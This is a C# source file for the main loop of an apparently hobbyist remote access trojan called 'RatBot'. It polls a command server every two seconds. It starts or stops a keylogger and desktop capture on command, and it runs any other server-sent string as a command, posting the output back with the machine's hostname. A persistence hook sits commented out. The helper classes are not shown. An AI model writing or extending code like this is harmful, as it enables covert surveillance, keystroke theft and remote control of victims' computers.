//-- for further improvement: put all webclient in try-catch
using System;

using System.Net;

using System.Windows.Forms;

namespace RatBot
{
    internal class Program
    {
        public static WebClient webClient = new WebClient();
        static void Main(string[] args)
        {
            ClientAdder.addNewClient(webClient);
            //ClientAdder.runAtStartup(); //--persistence
            ClientKeylogger.initClientKeylogger(); //--keylogger init but not started
            ClientDesktop.initClientDesktop(); //--desktop capture init but not started

            while (true)
            {
                System.Threading.Thread.Sleep(2000);

                //-- use 127.0.0.1 if your server is on the same machine as this client
                string name = Dns.GetHostName();

                webClient.Headers.Add("Content-Type", "application/x-www-form-urlencoded");
                string cmdFromServer = webClient.UploadString("http://127.0.0.1/getServerCommands.php", "client=" + name);

                if (cmdFromServer.Contains("nocmd" +
                    "")) continue;
                if (cmdFromServer.Contains("sayhello"))
                {
                    MessageBox.Show("Hello World");
                }
                else if (cmdFromServer.Contains("saybye"))
                {
                    MessageBox.Show("Goodbye");
                }
                else if (cmdFromServer.Contains("beep"))
                {
                    Console.Beep(500, 300);
                }
                //-- keylogger --
                else if (cmdFromServer.Contains("startkeylog"))
                {
                    //--do start keylog function
                    ClientKeylogger.StartKeylogger();
                }
                else if (cmdFromServer.Contains("stopkeylog"))
                {
                    //--do stop keylog function
                    ClientKeylogger.StopKeylogger();
                }
                //-- desktop capture --
                else if (cmdFromServer.Contains("startdc"))
                {
                    //--do start desktop capture function
                    ClientDesktop.StartDesktopCapture();
                }
                else if (cmdFromServer.Contains("stopdc"))
                {
                    //--do stop desktop capture function
                    ClientDesktop.StopDesktopCapture();
                }
                else
                {
                    string retString = Commands.Run(cmdFromServer);
                    Console.WriteLine(retString);
                    webClient.Headers.Add("Content-Type", "application/x-www-form-urlencoded");
                    webClient.UploadString("http://127.0.0.1/retString.php", "client=" + name + "&retstr=" + retString);
                }
                Console.WriteLine(cmdFromServer);

            }
        }

    }
}
